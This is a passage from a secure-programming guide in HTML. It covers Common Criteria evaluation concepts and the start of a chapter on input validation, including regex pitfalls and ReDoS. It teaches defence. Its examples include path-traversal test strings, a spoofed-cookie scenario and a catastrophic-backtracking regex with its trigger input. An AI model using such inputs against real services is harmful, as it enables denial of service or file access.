><P
>Both PPs and STs can go through a formal evaluation.
An evaluation of a PP simply ensures that the PP meets various documentation
rules and sanity checks.
An ST evaluation involves not just examining the ST document,
but more importantly it involves evaluating an actual system
(called the <SPAN
CLASS="QUOTE"
>&#8220;target of evaluation&#8221;</SPAN
>, or TOE).
The purpose of an ST evaluation is to ensure that, to the level of
the assurance requirements specified by the ST,
the actual product (the TOE) meets the ST&#8217;s security functional requirements.
Customers can then compare evaluated STs to
PPs describing what they want.
Through this comparison, consumers can determine if the
products meet their requirements - and if not, where the limitations are.</P
><P
>To create a PP or ST, you go through a process of identifying the
security environment, namely, your
assumptions, threats, and relevant organizational
security policies (if any).
From the security environment, you derive
the security objectives for the product or product type.
Finally, the security requirements are selected so that
they meet the objectives.
There are two kinds of security requirements: functional requirements
(what a product has to be able to do), and assurance requirements
(measures to inspire confidence that the objectives have been met).
Actually creating a PP or ST is often not a simple straight line as
outlined here, but the final result needs to show a clear relationship so
that no critical point is easily overlooked.
Even if you don&#8217;t plan to write an ST or PP,
the ideas in the CC can still be helpful;
the process of identifying the security environment, objectives, and
requirements is still helpful in identifying what&#8217;s really important.</P
><P
>The vast majority of the CC&#8217;s text is used to define standardized
functional requirements and assurance requirements.
In essence, the majority of the CC is a <SPAN
CLASS="QUOTE"
>&#8220;chinese menu&#8221;</SPAN
> of possible
security requirements that someone might want.
PP authors pick from the various options to describe what they want, and
ST authors pick from the options to describe what they provide.</P
><P
>Since many people might have difficulty identifying a reasonable set
of assurance requirements, so pre-created sets of assurance requirements
called <SPAN
CLASS="QUOTE"
>&#8220;evaluation assurance levels&#8221;</SPAN
> (EALs) have been defined, ranging
from 1 to 7.
EAL 2 is simply a standard shorthand for the set of assurance requirements
defined for EAL 2.
Products can add additional assurance measures, for example, they might
choose EAL 2 plus some additional assurance measures (if the combination
isn&#8217;t enough to achieve a higher EAL level, such a combination would be
called "EAL 2 plus").
There are mutual recognition agreements signed between many of the
world&#8217;s nations that will accept an evaluation done by
an accredited laboratory in the other countries as long as all of the
assurance measures taken were at the EAL 4 level or less.</P
><P
>If you want to actually write an ST or PP, there&#8217;s an
open source software program that can help you, called the
<SPAN
CLASS="QUOTE"
>&#8220;CC Toolbox&#8221;</SPAN
>.
It can make sure that dependencies between requirements
are met, suggest common requirements, and help you quickly
develop a document, but it obviously can&#8217;t do your thinking for you.
The specification of exactly what information
must be in a PP or ST are in CC part 1, annexes B and C respectively.</P
><P
>If you do decide to have your product (or PP) evaluated by
an accredited laboratory, be prepared to spend money, spend time,
and work throughout the process.
In particular, evaluations require paying an
accredited lab to do the evaluation, and higher levels of assurance
become rapidly more expensive.
Simply believing your product is secure isn&#8217;t good enough; evaluators
will require evidence to justify any claims made.
Thus, evaluations require documentation, and usually the available
documentation has to be improved or developed
to meet CC requirements (especially at the higher assurance levels).
Every claim has to be justified to some level of confidence, so the more
claims made, the stronger the claims, and the
more complicated the design, the more expensive an evaluation is.
Obviously, when flaws are found, they will usually need to be fixed.
Note that a laboratory is paid to evaluate a product and determine the truth.
If the product doesn&#8217;t meet its claims, then you basically have two
choices: fix the product, or change (reduce) the claims.</P
><P
>It&#8217;s important to discuss with customers what&#8217;s desired before beginning
a formal ST evaluation;
an ST that includes functional or assurance requirements
not truly needed by customers will
be unnecessarily expensive to evaluate, and an ST that omits
necessary requirements may not be acceptable to the customers
(because that necessary piece won&#8217;t have been evaluated).
PPs identify such requirements, but make sure that the PP
accurately reflects the customer&#8217;s real requirements (perhaps the customer
only wants a part of the functionality or assurance in the PP,
or has a different environment in mind, or wants something else instead
for the situations where your product will be used).
Note that an ST need not include every security feature in a product;
an ST only states what will be (or has been) evaluated.
A product that has a higher EAL rating is not necessarily more secure than a
similar product with a lower rating or no rating;
the environment might be different, the evaluation may have saved money and
time by not evaluating the other product at a higher level,
or perhaps the evaluation missed something important.
Evaluations are not proofs; they simply impose a defined minimum bar to
gain confidence in the requirements or product.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CC-ENVIRONMENT"
>4.2. Security Environment and Objectives</A
></H2
><P
>The first step in defining a PP or ST is identify the
<SPAN
CLASS="QUOTE"
>&#8220;security environment&#8221;</SPAN
>.
This means that you have to consider the physical environment
(can attackers access the computer hardware?),
the assets requiring protection (files, databases, authorization
credentials, and so on),
and the purpose of the TOE (what kind of product is it? what is
the intended use?).</P
><P
>In developing a PP or ST, you'd end up with a statement of
assumptions (who is trusted? is the network or platform benign?),
threats (that the system or its environment must counter),
and organizational security policies (that the system or its environment
must meet).
A threat is characterized in terms of a threat agent
(who might perform the attack?), a presumed attack method,
any vulnerabilities that are the basis for the attack, and what asset
is under attack.</P
><P
>You'd then define a set of security objectives for the system
and environment, and show that those objectives counter the threats
and satisfy the policies.
Even if you aren&#8217;t creating a PP or ST, thinking about your assumptions,
threats, and possible policies can help you avoid foolish decisions.
For example, if the computer network you&#8217;re using can be sniffed
(e.g., the Internet), then unencrypted passwords are a foolish idea
in most circumstances.</P
><P
>For the CC, you'd then identify the functional and assurance requirements
that would be met by the TOE, and which ones would be met by the environment,
to meet those security objectives.
These requirements would be selected from the <SPAN
CLASS="QUOTE"
>&#8220;chinese menu&#8221;</SPAN
> of the CC&#8217;s
possible requirements, and the next sections will briefly describe
the major classes of requirements.
In the CC, requirements are grouped into classes, which are subdivided into
families, which are further subdivided into components; the details of all this
are in the CC itself if you need to know about this.
A good diagram showing how this works is in the CC part 1, figure 4.5,
which I cannot reproduce here.</P
><P
>Again, if you&#8217;re not intending for your product to undergo a CC evaluation,
it&#8217;s still good to briefly determine this kind of information and informally
write include that information
in your documentation (e.g., the man page or whatever your documentation is).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CC-FUNCTIONAL-REQUIREMENTS"
>4.3. Security Functionality Requirements</A
></H2
><P
>This section briefly describes the CC security functionality requirements
(by CC class),
primarily to give you an idea of the kinds of security requirements
you might want in your software.
If you want more detail about the CC&#8217;s requirements, see CC part 2.
Here are the major classes of CC security requirements, along with
the 3-letter CC abbreviation for that class:
<P
></P
><UL
><LI
><P
>Security Audit (FAU).
Perhaps you&#8217;ll need to recognize, record, store, and analyze
security-relevant activities.
You&#8217;ll need to identify what you want to make auditable, since
often you can&#8217;t leave all possible auditing capabilities enabled.
Also, consider what to do when there&#8217;s no room left for auditing -
if you stop the system, an attacker may intentionally do things to be logged
and thus stop the system.</P
></LI
><LI
><P
>Communication/Non-repudiation (FCO).
This class is poorly named in the CC; officially it&#8217;s called
communication, but the real meaning is non-repudiation.
Is it important that an originator cannot deny having sent a message, or
that a recipient cannot deny having received it?
There are limits to how well technology itself can support
non-repudiation (e.g., a user might be able to give their private key away
ahead of time if they wanted to be able to repudiate something later),
but nevertheless for some applications supporting non-repudiation
capabilities is very useful.</P
></LI
><LI
><P
>Cryptographic Support (FCS).
If you&#8217;re using cryptography, what operations use cryptography,
what algorithms and key sizes are you using, and how are you managing
their keys (including distribution and destruction)?</P
></LI
><LI
><P
>User Data Protection (FDP).
This class specifies requirement for protecting user data, and is a big
class in the CC with many families inside it.
The basic idea is that you should specify a policy for data
(access control or information flow rules),
develop various means to implement the policy,
possibly support off-line storage, import, and export, and
provide integrity when transferring user data between TOEs.
One often-forgotten issue is residual information protection - is it
acceptable if an attacker can later recover <SPAN
CLASS="QUOTE"
>&#8220;deleted&#8221;</SPAN
> data?</P
></LI
><LI
><P
>Identification and authentication (FIA).
Generally you don&#8217;t just want a user to report who they are
(identification) - you need to verify their identity, a process
called authentication.
Passwords are the most common mechanism for authentication.
It&#8217;s often useful to limit the number of authentication attempts
(if you can) and limit the feedback during authentication
(e.g., displaying asterisks instead of the actual password).
Certainly, limit what a user can do before authenticating; in many cases,
don&#8217;t let the user do anything without authenticating.
There may be many issues controlling when a session can start, but in the CC
world this is handled by the "TOE access" (FTA) class described below instead.</P
></LI
><LI
><P
>Security Management (FMT).
Many systems will require some sort of management (e.g., to
control who can do what), generally by those who are given a more
trusted role (e.g., administrator).
Be sure you think through what those special operations are, and ensure that
only those with the trusted roles can invoke them.
You want to limit trust; ideally, even more trusted roles should be limited
in what they can do.</P
></LI
><LI
><P
>Privacy (FPR).
Do you need to support anonymity, pseudonymity, unlinkability,
or unobservability?
If so, are there conditions where you want or don&#8217;t want these
(e.g., should an administrator be able to determine the real identity
of someone hiding behind a pseudonym?).
Note that these can seriously conflict with
non-repudiation, if you want those too.
If you&#8217;re worried about sophisticated threats, these functions
can be hard to provide.</P
></LI
><LI
><P
>Protection of the TOE Security Functions/Self-protection (FPT).
Clearly, if the TOE can be subverted, any security functions it provides
aren&#8217;t worthwhile, and in many cases a TOE has to provide at least some
self-protection.
Perhaps you should "test the underlying abstract machine" - i.e., test
that the underlying components meet your assumptions,
or have the product run self-tests
(say during start-up, periodically, or on request).
You should probably "fail secure", at least under certain conditions;
determine what those conditions are.
Consider phyical protection of the TOE.
You may want some sort of secure recovery function after a failure.
It&#8217;s often useful to have replay detection (detect when an attacker is
trying to replay older actions) and counter it.
Usually a TOE must make sure that any access checks are
always invoked and actually succeed before performing a restricted action.</P
></LI
><LI
><P
>Resource Utilization (FRU).
Perhaps you need to provide fault tolerance,
a priority of service scheme, or support
resource allocation (such as a quota system).</P
></LI
><LI
><P
>TOE Access (FTA).
There may be many issues controlling sessions.
Perhaps there should be a limit on the number of concurrent sessions
(if you&#8217;re running a web service, would it make sense for the same user
to be logged in simultaneously, or from two different machines?).
Perhaps you should lock or terminate a session automatically
(e.g., after a timeout), or let users initiate a session lock.
You might want to include a standard warning banner.
One surprisingly useful piece of information is displaying, on login,
information about the last session (e.g., the date/time and location of the
last login) and the date/time of the
last unsuccessful attempt - this gives users information
that can help them detect interlopers.
Perhaps sessions can only be established based on other criteria
(e.g., perhaps you can only use the program during business hours).</P
></LI
><LI
><P
>Trusted path/channels (FTP).
A common trick used by attackers is to make the screen appear to be
something it isn&#8217;t, e.g., run an ordinary program that looks like a
login screen or a forged web site.
Thus, perhaps there needs to be a "trusted path" - a way that users
can ensure that they are talking to the "real" program.</P
></LI
></UL
>
&#13;</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CC-ASSURANCE-REQUIREMENTS"
>4.4. Security Assurance Measure Requirements</A
></H2
><P
>As noted above, the CC has a set of possible assurance requirements that
can be selected, and several predefined sets of assurance requirements
(EAL levels 1 through 7).
Again, if you&#8217;re actually going to go through a CC evaluation, you
should examine the CC documents; I&#8217;ll skip describing the measures
involving reviewing official CC documents (evaluating PPs and STs).
Here are some assurance measures that can increase the confidence
others have in your software:
<P
></P
><UL
><LI
><P
>Configuration management (ACM).
At least, have unique a version identifier for each TOE release, so that
users will know what they have.
You gain more assurance if you have good automated tools to control
your software, and have separate version identifiers for each piece
(typical CM tools like CVS can do this, although CVS doesn&#8217;t record
changes as atomic changes which is a weakness of it).
The more that&#8217;s under configuration management, the better;
don&#8217;t just control your code, but also control documentation,
track all problem reports (especially security-related ones),
and all development tools.</P
></LI
><LI
><P
>Delivery and operation (ADO).
Your delivery mechanism should ideally let users detect unauthorized
modifications to prevent someone else masquerading as the developer, and
even better, prevent modification in the first place.
You should provide documentation on how to securely install, generate,
and start-up the TOE, possibly generating a log describing how the TOE
was generated.</P
></LI
><LI
><P
>Development (ADV).
These CC requirements deal with documentation describing the TOE
implementation, and that they need to be consistent between each other
(e.g., the information in the ST, functional specification, high-level
design, low-level design, and code, as well as any models of the
security policy).</P
></LI
><LI
><P
>Guidance documents (AGD).
Users and administrators of your product will probably need some
sort of guidance to help them use it correctly.
It doesn&#8217;t need to be on paper; on-line help and "wizards" can help too.
The guidance should include warnings about actions that may be
a problem in a secure environemnt, and describe how to use the system
securely.</P
></LI
><LI
><P
>Life-cycle support (ALC).
This includes development security (securing the systems being used
for development, including physical security),
a flaw remediation process (to track and correct all security flaws),
and selecting development tools wisely.</P
></LI
><LI
><P
>Tests (ATE).
Simply testing can help, but remember that you need to test the
security functions and not just general functions.
You should check if something is set to permit, it&#8217;s permitted, and
if it&#8217;s forbidden, it is no longer permitted.
Of course, there may be clever ways to subvert this, which is what
vulnerability assessment is all about (described next).</P
></LI
><LI
><P
>Vulnerability Assessment (AVA).
Doing a vulnerability analysis is useful, where
someone pretends to be an attacker and tries to find vulnerabilities
in the product using the available information, including documentation
(look for "don&#8217;t do X" statements and see if an attacker could exploit them)
and publicly known past vulnerabilities of this or similar products.
This book describes various ways of countering known vulnerabilities of
previous products to problems such as replay attacks (where known-good
information is stored and retransmitted), buffer overflow attacks,
race conditions, and other issues that the rest of this book describes.
The user and administrator guidance documents should be examined to
ensure that misleading, unreasonable, or conflicting guidance is
removed, and that secrity procedures for all modes of operation
have been addressed.
Specialized systems may need to worry about covert channels;
read the CC if you wish to learn more about covert channels.</P
></LI
><LI
><P
>Maintenance of assurance (AMA).
If you&#8217;re not going through a CC evaluation, you don&#8217;t need a formal
AMA process, but all software undergoes change.
What is your process to give all your users strong confidence that future
changes to your software will not create new vulnerabilities?
For example, you could
establish a process where multiple people review any proposed changes.</P
></LI
></UL
></P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="INPUT"
></A
>Chapter 5. Validate All Input</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>Wisdom will save you from the ways of wicked men,
from men whose words are perverse...</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Proverbs 2:12 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>Some inputs are from untrustable users, so those inputs must be validated
(filtered) before being
used.
We will first discuss the basics of input validation.
This is followed by
subsections that discuss different kinds of inputs to a program;
note that input includes process state such as environment variables,
umask values, and so on.
Not all inputs are under the control of an untrusted user, so you need
only worry about those inputs that are.</P
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="VALIDATION-BASICS"
>5.1. Basics of input validation</A
></H2
><P
>First, make sure you identify <EM
>all</EM
>
inputs from potentially untrusted users,
so that you validate them all.
Where you can, eliminate the inputs or make it impossible for untrusted users
to provide information to them.
At each remaining input from potentially untrusted users you need to
validate the data that comes in.</P
><P
>You should determine what is legal, as narrowly as you reasonably can,
and reject anything that does not match that definition.
The rules that define what is legal, and by implication
reject everything else, are called a
<EM
>whitelist</EM
>.
Do <EM
>not</EM
> do the reverse, that is,
do not try to identify what is illegal and write code to reject those cases.
This bad approach, where you try to list everything that should be
rejected, is called <EM
>blacklisting</EM
>;
the list of inputs that should be rejected is called a
<EM
>blacklist</EM
>.
Blacklisting typically leads to security vulnerabilities,
because you are likely to forget to handle one or more
important cases of illegal input.
Improper input validation is such a common cause of security
vulnerabilities that it has its own CWE identifier,
CWE-20.</P
><P
>There is a good reason for identifying <SPAN
CLASS="QUOTE"
>&#8220;illegal&#8221;</SPAN
> values, though, and that&#8217;s
as a set of tests
to be sure that your validation code is thorough.
These tests may possibly just executed in your head, but at least a few
should become test cases.
When I set up an input filter,
I mentally attack my whitelist with a few pre-identified illegal values
to make sure that a few obvious illegal values will not get through.
Depending on the input, here are a few examples of common <SPAN
CLASS="QUOTE"
>&#8220;illegal&#8221;</SPAN
> values
that your input filters may need to prevent:
the empty string,
<SPAN
CLASS="QUOTE"
>&#8220;.&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;../&#8221;</SPAN
>,
anything starting with <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;.&#8221;</SPAN
>,
anything with <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;&#38;&#8221;</SPAN
>
inside it, any control characters (especially NIL and newline), and/or
any characters with the <SPAN
CLASS="QUOTE"
>&#8220;high bit&#8221;</SPAN
> set (especially
values decimal 254 and 255, and character 133 is the Unicode Next-of-line
character used by OS/390).
Again, your code should not be checking for <SPAN
CLASS="QUOTE"
>&#8220;bad&#8221;</SPAN
> values; you should do
this check mentally to be sure that your pattern ruthlessly limits input
values to legal values.
If your pattern isn&#8217;t sufficiently narrow, you need to carefully
re-examine the pattern to see if there are other problems.</P
><P
>Limit the maximum character length (and minimum length if appropriate),
and be sure to not lose control when such lengths are exceeded
(see <A
HREF="#BUFFER-OVERFLOW"
>Chapter 6</A
> for more about buffer overflows).</P
><P
>Here are a few common data types, and things you should validate
before using them from an untrusted user:
<P
></P
><UL
><LI
><P
>For strings, identify the legal characters or legal patterns
(e.g., as a regular expression) and reject anything not matching that form.
There are special problems when strings contain control characters
(especially linefeed or NIL) or metacharacters (especially shell
metacharacters); it is often
best to <SPAN
CLASS="QUOTE"
>&#8220;escape&#8221;</SPAN
> such metacharacters immediately when the input is received so
that such characters are not accidentally sent.
CERT goes further and recommends escaping all characters
that aren&#8217;t in a list of characters not needing escaping [CERT 1998, CMU 1998].
See <A
HREF="#HANDLE-METACHARACTERS"
>Section 8.3</A
>
for more information on metacharacters.
Note that
<A
HREF="http://www.w3.org/TR/2001/NOTE-newline-20010314"
TARGET="_top"
>line ending encodings vary on different computers</A
>:
Unix-based systems use character 0x0a (linefeed),
CP/M and DOS based systems (including Windows) use 0x0d 0x0a
(carriage-return linefeed, and some programs incorrectly reverse the order),
the Apple MacOS uses 0x0d (carriage return), and IBM OS/390 uses
0x85 (0x85) (next line, sometimes called newline).</P
></LI
><LI
><P
>Limit all numbers to the minimum (often zero) and maximum allowed values.</P
></LI
><LI
><P
>A full email address checker is actually quite complicated, because there
are legacy formats that greatly complicate validation if you need
to support all of them; see mailaddr(7) and IETF RFC 822 [RFC 822]
for more information if such checking is necessary.
Friedl [1997] developed a regular expression to check if
an email address is valid (according to the specification);
his <SPAN
CLASS="QUOTE"
>&#8220;short&#8221;</SPAN
> regular expression is 4,724 characters,
and his <SPAN
CLASS="QUOTE"
>&#8220;optimized&#8221;</SPAN
> expression (in appendix B) is 6,598 characters long.
And even that regular expression isn&#8217;t perfect; it can&#8217;t recognize local
email addresses, and it can&#8217;t handle nested parentheses in comments
(as the specification permits).
Often you can simplify and only permit the <SPAN
CLASS="QUOTE"
>&#8220;common&#8221;</SPAN
> Internet
address formats.</P
></LI
><LI
><P
>Filenames should be checked; see
<A
HREF="#FILE-NAMES"
>Section 5.6</A
> for more information on filenames.</P
></LI
><LI
><P
>URIs (including URLs) should be checked for validity.
If you are directly acting on a URI (i.e., you&#8217;re implementing a web
server or web-server-like program and the URL is a request for your data),
make sure the URI is valid, and be especially careful of URIs that
try to <SPAN
CLASS="QUOTE"
>&#8220;escape&#8221;</SPAN
> the document root (the area of the filesystem
that the server is responding to).
The most common ways to escape the document root are via <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
> or
a symbolic link, so most servers check any <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
> directories themselves
and ignore symbolic links unless specially directed.
Also remember to decode any encoding first (via URL encoding or
UTF-8 encoding), or an encoded <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
> could slip through.
URIs aren&#8217;t supposed to even include UTF-8 encoding, so the safest thing
is to reject any URIs that include characters with high bits set.</P
><P
>If you are implementing a system that uses the URI/URL as data,
you&#8217;re not home-free at all; you need to ensure that malicious users
can&#8217;t insert URIs that will harm other users.
See <A
HREF="#VALIDATING-URIS"
>Section 5.13.4</A
>
for more information about this.</P
></LI
><LI
><P
>When accepting cookie values, make sure to check the the domain value
for any cookie you&#8217;re using
is the expected one.  Otherwise, a (possibly cracked) related site
might be able to insert spoofed cookies.
Here&#8217;s an example from IETF RFC 2965 of how failing to do this check could
cause a problem:
<P
></P
><UL
><LI
><P
>         User agent makes request to victim.cracker.edu, gets back
         cookie session_id="1234" and sets the default domain
         victim.cracker.edu.</P
></LI
><LI
><P
>         User agent makes request to spoof.cracker.edu, gets back cookie
         session-id="1111", with Domain=".cracker.edu".</P
></LI
><LI
><P
>         User agent makes request to victim.cracker.edu again, and passes:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>         Cookie: $Version="1"; session_id="1234",
                 $Version="1"; session_id="1111"; $Domain=".cracker.edu"</PRE
></FONT
></TD
></TR
></TABLE
>
         The server at victim.cracker.edu should detect that the second
         cookie was not one it originated by noticing that the Domain
         attribute is not for itself and ignore it.</P
></LI
></UL
></P
></LI
></UL
></P
><P
>Unless you account for them,
the legal character patterns must not include characters
or character sequences that have special meaning to either
the program internals or the eventual output:
<P
></P
><UL
><LI
><P
>A character sequence may have special meaning to the program&#8217;s internal
storage format.
For example, if you store data (internally or externally) in delimited
strings, make sure that the delimiters are not permitted data values.
A number of programs
store data in comma (,) or colon (:) delimited text files;
inserting the delimiters
in the input can be a problem unless the program accounts for it (i.e.,
by preventing it or encoding it in some way).
Other characters often causing these problems include single and double quotes
(used for surrounding strings)
and the less-than sign "&#60;"
(used in SGML, XML, and HTML to indicate a tag&#8217;s beginning; this is important
if you store data in these formats).
Most data formats have an escape sequence to handle these cases; use it,
or filter such data on input.</P
></LI
><LI
><P
>A character sequence may have special meaning if sent back out to a user.
A common example of this is permitting HTML tags in data input that will later
be posted to other readers (e.g., in a guestbook or <SPAN
CLASS="QUOTE"
>&#8220;reader comment&#8221;</SPAN
> area).
However, the problem is much more general.
See <A
HREF="#CROSS-SITE-MALICIOUS-CONTENT"
>Section 7.16</A
> for a general discussion
on the topic, and see <A
HREF="#FILTER-HTML"
>Section 5.13</A
> for a specific discussion
about filtering HTML.</P
></LI
></UL
></P
><P
>These tests should usually be centralized in one place so that the
validity tests can be easily examined for correctness later.</P
><P
>Make sure that your validity test is actually correct; this is particularly
a problem when checking input that will be used by another program
(such as a filename, email address, or URL).
Often these tests have subtle errors, producing the so-called
<SPAN
CLASS="QUOTE"
>&#8220;deputy problem&#8221;</SPAN
> (where the checking program
makes different assumptions than the program that actually uses the data).
If there&#8217;s a relevant standard, look at it, but also search to see if
the program has extensions that you need to know about.</P
><P
>While parsing user input, it&#8217;s a good idea to temporarily drop all privileges,
or even create separate processes (with the parser having permanently dropped
privileges, and the other process performing security checks against the
parser requests).
This is especially true if the parsing task is complex (e.g., if you use
a lex-like or yacc-like tool), or if the programming language
doesn&#8217;t protect against buffer overflows (e.g., C and C++).
See
<A
HREF="#MINIMIZE-PRIVILEGES"
>Section 7.4</A
>
for more information on minimizing privileges.</P
><P
>When using data for security decisions (e.g., <SPAN
CLASS="QUOTE"
>&#8220;let this user in&#8221;</SPAN
>),
be sure to use trustworthy channels.
For example, on a public Internet, don&#8217;t just use the machine IP address
or port number as the sole way to authenticate users, because in most
environments this information can be set
by the (potentially malicious) user.
See
<A
HREF="#TRUSTWORTHY-CHANNELS"
>Section 7.12</A
> for more information.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="VALIDATION-TOOLS-REGEX"
>5.2. Input Validation Tools including Regular Expressions</A
></H2
><P
>There are many ways to validate input.
Number ranges can be checked using typical condtions such as less-than.
If a string can only be one of a short list of possibilities, simply
enumerate the possibilities and ensure that the input is one of them.
If the input is extremely complex, tools often used to create compilers
(such as lexers and parser generators) may be appropriate, though
be sure that these tools are prepared to process malicious input.</P
><P
>In many cases regular expression libraries are especially useful for
input validation.
Many whitelists are easily expressed as regular expressions, making them
a very easy tool to use.
In addition, regular expression libraries are built-in or easily available
in almost all language (the POSIX specification even requires one).</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="REGEX-BASICS"
>5.2.1. Introduction to regular expressions</A
></H3
><P
>The regular expression language
is a simple language for describing text patterns.
There are three major variants of the language in use:
the very old POSIX <SPAN
CLASS="QUOTE"
>&#8220;basic regular expresion (BRE)&#8221;</SPAN
> format,
the POSIX <SPAN
CLASS="QUOTE"
>&#8220;extended regular expression (ERE)&#8221;</SPAN
>, and the
perl-compatible regular expression (PCRE) format.
From here on we&#8217;ll assume you&#8217;re using the ERE or PCRE variations
of the language.
In the regular expression language,
a latin letter or digit simply represents itself.
A dot (period) matches any one character (with the possible exception of
newline, depending on various options).</P
><P
>A bracketed expression matches one character, as long as that one
character is one of the characters listed inside the brackets.
Inside brackets the period has no special meaning (it just matches a period),
and a <SPAN
CLASS="QUOTE"
>&#8220;-&#8221;</SPAN
> inside brackets indicates a range,
so <SPAN
CLASS="QUOTE"
>&#8220;[A-Za-z0-9]&#8221;</SPAN
> matches one Latin alphanumeric character
(presuming you&#8217;re not using EBCDIC).</P
><P
>You can also indicate repetition, e.g.,
<SPAN
CLASS="QUOTE"
>&#8220;?&#8221;</SPAN
> means that the previous expression is optional
(may occur 0 or 1 times),
<SPAN
CLASS="QUOTE"
>&#8220;+&#8221;</SPAN
> means the previous expression may repeat 1 or more times, and
a <SPAN
CLASS="QUOTE"
>&#8220;*&#8221;</SPAN
> means that the previous expression may repeat 0 or more times.
More generally, <SPAN
CLASS="QUOTE"
>&#8220;{N,M}&#8221;</SPAN
> indicates that the previous expression can occur
N through M number of repetitions.
Parentheses can group a sequence so that it is considered a single pattern.
A much more complete discussion of regular expressions is given in
[Friedl 1997].</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="REGEX-FOR-VALIDATION"
>5.2.2. Using regular expressions for input validation</A
></H3
><P
>The regular expression language was originally designed for searching,
not for describing input filters.
To use regular expressions as whitelists, your whitelists will
typically begin with <SPAN
CLASS="QUOTE"
>&#8220;^&#8221;</SPAN
>
(which normally means <SPAN
CLASS="QUOTE"
>&#8220;match the beginning of the string&#8221;</SPAN
>)
and end with ''$''
(which normally means <SPAN
CLASS="QUOTE"
>&#8220;match the end of the string&#8221;</SPAN
>).
Thus, you can require that an input have a Latin letter,
followed by one or more digits, using this expression:
<SPAN
CLASS="QUOTE"
>&#8220;[A-Za-z][0-9]+&#8221;</SPAN
>.</P
><P
>A word of warning: Regular expressions support the <SPAN
CLASS="QUOTE"
>&#8220;|&#8221;</SPAN
> operator,
which means <SPAN
CLASS="QUOTE"
>&#8220;any one of these&#8221;</SPAN
>.
However, the precedence of <SPAN
CLASS="QUOTE"
>&#8220;|&#8221;</SPAN
> is different from what many expect,
and unwary developers can end up having vulnerable input validation routines
as a result.
For example, the expression <SPAN
CLASS="QUOTE"
>&#8220;^x|y$&#8221;</SPAN
> means
<SPAN
CLASS="QUOTE"
>&#8220;begins with x, or ends with y&#8221;</SPAN
>.
In practically all cases you should surround the <SPAN
CLASS="QUOTE"
>&#8220;|&#8221;</SPAN
> branches
with parentheses when using regular expressions for input filtering, e.g.,
<SPAN
CLASS="QUOTE"
>&#8220;^(x|y)$&#8221;</SPAN
> means <SPAN
CLASS="QUOTE"
>&#8220;either an x or a y&#8221;</SPAN
>.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="REGEX-REDOS"
>5.2.3. Regular expression denial of service (reDOS) attacks</A
></H3
><P
>In some cases, when using regular expressions (regexes) there is a risk
of enabling regular expression denial of service (reDOS) attacks.
Some regexes, on some implementations, can take
exponential time and memory to process certain data.
Such regexes are called "evil" regexes.
Attackers can intentionally provide triggering data (and
maybe regexes!) to cause this exponential growth, leading to a
denial-of-service.
Thus, when using regexes, developers need to avoid these regexes
or limit these effects.
In many cases this is not hard, once you're aware of the issue.</P
><P
>Fundamentally,
many modern regex engines (including those in PCRE, perl, Java, etc.)
use backtracking to implement regexes.
In these implementations, if there is more than one potential solution
for a match, if will first try one branch to try to find a match, and
if it doesn't match, it will repeatedly
backtrack to the last untried solution and try again
until all options are exhausted.
The problem is that an attacker may be able to cause many backtracks.
In general, you want to bound the number of backtracks that occur.
The primary risks are groups
with repetition, pariticularly if they are
inside more repetition or alternation with overlapping patterns.
The regex "^([a-zA-Z]+)*$" with data "aaa1" involves a large number
of backtracks; once the engine encounters the "1", many implementations
will backtrack through all possible combinations of "+" and "*" before
it can determine there is no match.</P
><P
>Simply avoiding the use of regexes doesn't reliably
counter reDOS attacks, because
naively implementing the regex processing causes exactly the same problem.
There are, however, simple things that can be done.
First, avoid running regexes provided by an attacker (or limit the time
they can run).
If you can, use a Thompson NFA-to-DFA implementation; these never
backtrack and thus are immune to the problem (though they can't provide
some useful functions like backreferences).
Otherwise, review regexes to prevent backtracking if you can.
At any point, any given character should cause only
one branch to be taken in regex (just imagine that the regex is code).
For every repetition, you should be able to uniquely determine
if the code will repeat or not based on the single next input character.
You should especially examine any repetition in a repetition - if possible,
eliminate them (these in particular cause a combinatorial explosion).
You can use regex fuzzers and static analysis tools to examine these.
In addition, you can limit the input data size first before
before using a regex; this greatly limits the effects of
exponential growth in time.
You can find more information in [Crosby2003] and the
<A
HREF="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
TARGET="_top"
>OWASP's "Regular Expression Denial of Service"</A
></P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="COMMAND-LINE"
>5.3. Command line</A
></H2
><P
>Many programs take input from the command line.
A setuid/setgid program&#8217;s command line data is provided by
an untrusted user, so a setuid/setgid program must defend itself from
potentially hostile command line values.
Attackers can send just about any kind of data through a command line
(through calls such as the execve(3) call).
Therefore, setuid/setgid programs must completely
validate the command line inputs and
